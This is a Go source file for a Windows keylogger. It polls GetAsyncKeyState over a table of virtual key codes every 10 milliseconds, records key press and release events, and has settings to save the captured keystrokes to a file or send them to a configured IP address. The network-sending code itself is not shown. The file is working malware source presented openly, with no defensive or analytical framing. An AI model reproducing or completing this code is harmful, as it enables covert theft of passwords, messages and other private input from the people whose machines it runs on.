package main

import (
	//"fmt"
	"syscall"
	"time"
)

// map containing the virtual keyboard key codes for windows

var codes = map[int]string{
	0x01: "LMB",
	0x02: "RMB",
	0x04: "MMB",
	0x08: "BACKSPACE",
	0x09: "TAB",
	0x0C: "CLEAR",
	0x0D: "ENTER",
	//0x10: "SHIFT",
	//0x11: "CONTROL",
	0x12: "ALT",
	0x13: "PAUSE",
	0x14: "CAPSLOCK",
	0x1B: "ESC",
	0x20: "SPACE",
	0x21: "PAGEUP",
	0x22: "PAGEDOWN",
	0x23: "END",
	0x24: "HOME",
	0x25: "LEFTARROW",
	0x26: "UPARROW",
	0x27: "RIGHTARROW",
	0x28: "DOWNARROW",
	0x29: "SELECT",
	0x2A: "PRINT",
	0x2B: "EXECUTE",
	0x2C: "PRINTSCREEN",
	0x2D: "INSERT",
	0x2E: "DELETE",
	0x2F: "HELP",
	0x30: "0",
	0x31: "1",
	0x32: "2",
	0x33: "3",
	0x34: "4",
	0x35: "5",
	0x36: "6",
	0x37: "7",
	0x38: "8",
	0x39: "9",
	0x41: "A",
	0x42: "B",
	0x43: "C",
	0x44: "D",
	0x45: "E",
	0x46: "F",
	0x47: "G",
	0x48: "H",
	0x49: "I",
	0x4A: "J",
	0x4B: "K",
	0x4C: "L",
	0x4D: "M",
	0x4E: "N",
	0x4F: "O",
	0x50: "P",
	0x51: "Q",
	0x52: "R",
	0x53: "S",
	0x54: "T",
	0x55: "U",
	0x56: "V",
	0x57: "W",
	0x58: "X",
	0x59: "Y",
	0x5A: "Z",
	0x5B: "WINDOWSKEY",
	0x5C: "WINDOWSKEY",
	0x5D: "APPS",
	0x5F: "SLEEP",
	0x60: "NUMPAD0",
	0x61: "NUMPAD1",
	0x62: "NUMPAD2",
	0x63: "NUMPAD3",
	0x64: "NUMPAD4",
	0x65: "NUMPAD5",
	0x66: "NUMPAD6",
	0x67: "NUMPAD7",
	0x68: "NUMPAD8",
	0x69: "NUMPAD9",
	0x6A: "MULTIPLY",
	0x6B: "ADD",
	0x6C: "SEP",
	0x6D: "SUBTRACT",
	0x6E: "DECIMAL",
	0x6F: "DIVIDE",
	0x70: "F1",
	0x71: "F2",
	0x72: "F3",
	0x73: "F4",
	0x74: "F5",
	0x75: "F6",
	0x76: "F7",
	0x77: "F8",
	0x78: "F9",
	0x79: "F10",
	0x7A: "F11",
	0x7B: "F12",
	0x7C: "F13",
	0x7D: "F14",
	0x7E: "F15",
	0x7F: "F16",
	0x80: "F17",
	0x81: "F18",
	0x82: "F19",
	0x83: "F20",
	0x84: "F21",
	0x85: "F22",
	0x86: "F23",
	0x87: "F24",
	0x90: "NUMLOCK",
	0x91: "SCROLLLOCK",
	0xA0: "LSHIFT",
	0xA1: "RSHIFT",
	0xA2: "LCONTROL",
	0xA3: "RCONTROL",
	0xA4: "LMENU",
	0xA5: "RMENU",
	0xAD: "MUTE",
	0xAE: "VOLUMEDOWN",
	0xAF: "VOLUMEUP",
	0xB0: "NEXTTRACK",
	0xB1: "PREVTRACK",
	0xB2: "STOP",
	0xB3: "PLAY/PAUSE",
}

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	getState = user32.NewProc("GetAsyncKeyState")
)

// represents the keylogger
type keylogger struct {
	// all keys
	log []key

	// controls whether keystrokes are saved to a file
	saveToFile bool
	filename   string

	// controls whether keystrokes are sent over the network
	send  bool
	ipdst string
}

// information about key events (key presses/up/down)
type key struct {
	// string representing the key
	name string

	// true means key down, false means key up
	down bool
}

// starts logging and saving the data to a list where each element is a KEYDOWN or KEYUP event
// should be called with 'go' keyword to run in background
// time param is time in seconds to log for
func (k *keylogger) startLogging(duration int) {

	// logs last iteration of current keys so adjacent logs where the key's down field does not change can be discarded
	prevCurrentKeys := []key{}

	// loops for the given amount of seconds
	for start := time.Now(); time.Since(start) < time.Second*time.Duration(duration); {
		currentKeys := []key{}
		for keycode := 0x01; keycode < 0xB3; keycode++ {
			_, exists := codes[keycode]
			if !exists {
				continue // skip this key if it is not in the map
			}

			val, _, _ := getState.Call(uintptr(keycode))
			isDown := (val == 32769)
			currentKeys = append(currentKeys, key{name: codes[keycode], down: isDown})
		}

		// check differences between current and previous key logs (they should be the same length)
		if len(prevCurrentKeys) != 0 {
			for i := 0; i < len(currentKeys); i++ {
				if currentKeys[i].down != prevCurrentKeys[i].down { // then there was a change in state!
					k.log = append(k.log, currentKeys[i])
				}
			}
		} else {
			// has the function of 'extending' the slice
			k.log = append(k.log, currentKeys...)
		}

		prevCurrentKeys = currentKeys
		time.Sleep(10 * time.Millisecond) // limit logging to every 1/100 second
	}

}

// set keylogger to record results in given file
func (k *keylogger) setSaveToFile(filename string) {
	k.saveToFile = true
	k.send = false
	k.filename = filename
}

// set keylogger to send results to given ip destination
func (k *keylogger) setSend(ipdst string) {
	k.send = true
	k.saveToFile = false
	k.ipdst = ipdst
}
